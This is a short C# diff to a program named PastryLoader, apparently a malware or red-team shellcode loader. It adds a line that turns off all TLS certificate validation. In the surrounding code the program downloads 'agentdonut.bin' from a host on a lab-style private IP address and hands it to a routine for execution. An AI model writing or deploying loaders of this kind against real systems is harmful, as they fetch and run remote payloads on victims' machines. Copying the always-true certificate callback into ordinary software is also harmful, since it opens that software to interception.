@@ -75,6 +75,7 @@ namespace PastryLoader
         static void Main(string[] args)
         {
             if (!HelloTest()) { return; }
+            ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
             var data = DownloadAttemptOne("http://192.168.56.102:9000/agentdonut.bin");
             if (data == null) { return; }
             if (!HelloCode(data)) { return; }
